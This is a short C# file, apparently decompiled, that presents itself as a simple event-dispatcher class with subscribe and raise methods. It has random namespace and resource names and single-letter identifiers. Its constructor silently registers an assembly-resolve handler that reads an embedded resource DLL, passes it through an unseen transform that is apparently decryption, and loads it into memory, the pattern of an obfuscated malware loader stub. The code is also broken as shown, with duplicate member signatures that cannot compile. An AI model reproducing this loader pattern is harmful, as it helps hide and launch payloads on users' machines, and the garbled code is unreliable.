using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Reflection;

namespace Esulsglfyznb;

public sealed class a
{
	[Serializable]
	private sealed class a
	{
		public static readonly a a = new a();

		public static ResolveEventHandler b;

		internal Assembly a(object a, ResolveEventArgs b)
		{
			string name = "Esulsglfyznb.Gcalmuzpmqwmccg.dll";
			using Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name);
			byte[] array = new byte[stream.Length];
			stream.Read(array, 0, array.Length);
			return Assembly.Load(new e().b(array));
		}
	}

	private sealed class b
	{
		public c a;

		internal void a(object a)
		{
			this.a();
		}
	}

	public delegate void c();

	public delegate void d(object a);

	protected Dictionary<string, ArrayList> a;

	private object m_b;

	public a()
	{
		this.a = new Dictionary<string, ArrayList>();
		a(this);
		this.a();
	}

	public object a()
	{
		return this.m_b;
	}

	public void a(object a)
	{
		this.m_b = a;
	}

	public void a()
	{
		AppDomain.CurrentDomain.AssemblyResolve += Esulsglfyznb.a.a.a.a;
	}

	public void a(string a, d b)
	{
		if (!this.a.TryGetValue(a, out var _))
		{
			this.a.Add(a, new ArrayList());
		}
		this.a[a].Add(b);
	}

	public void a(string a, c b)
	{
		b b2 = new b();
		b2.a = b;
		this.a(a, b2.a);
	}

	public void a(string a)
	{
		if (this.a.TryGetValue(a, out var _))
		{
			this.a.Remove(a);
		}
	}

	public void b(string a)
	{
		if (!this.a.TryGetValue(a, out var value))
		{
			return;
		}
		foreach (d item in value)
		{
			item(this.a());
		}
	}
}
